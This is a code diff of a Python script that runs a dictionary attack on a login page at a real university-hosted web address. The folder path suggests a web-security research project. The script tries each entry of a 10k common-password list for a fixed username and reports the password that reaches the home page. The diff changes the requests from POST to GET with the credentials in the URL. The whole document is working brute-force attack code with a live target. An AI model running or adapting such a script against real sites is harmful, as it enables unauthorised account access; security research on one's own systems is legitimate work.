@@ -9,29 +9,23 @@ import requests
 # URL of the login page
 login_url = 'https://web.engr.oregonstate.edu/~snelgrot/index.php'
 
-#replace with your file location of  have most-common.txt
+# Replace with your file location of 10k-most-common.txt
 with open("C:\\xampp\\htdocs\\Web-Sec-Research-Proj\\10k-most-common.txt", "r") as file:
     for line in file:
-    # User credentials. Use common username ie dave, bob, paul, johnathan, tyler
+        # User credentials. Use common username ie dave, bob, paul, johnathan, tyler
         username = 'johnathan'
-        password = line
-        password = password.rstrip("\n")
+        password = line.strip()
 
+        # Construct URL with query parameters
+        login_url_with_params = f'{login_url}?user_name={username}&password={password}'
 
-        # POST data for login
-        data = {
-            'user_name': username,
-            'password': password
-        }
-
-        # Send POST request to log in
-        response = requests.post(login_url, data=data)
+        # Send GET request to log in
+        response = requests.get(login_url_with_params)
 
         # Check if the login was successful
         if response.status_code == 200:  # Assuming the server responds with a status code of 200 for a successful login
-
             current_page_url = response.url
-            if current_page_url== 'https://web.engr.oregonstate.edu/~snelgrot/home.php':
+            if current_page_url == 'https://web.engr.oregonstate.edu/~snelgrot/home.php':
                 print("This password worked: " + password)
                 file.close()
                 exit()
@@ -39,6 +33,5 @@ with open("C:\\xampp\\htdocs\\Web-Sec-Research-Proj\\10k-most-common.txt", "r") 
                 continue
 
     else:
-
         print("Password not found")
         file.close()
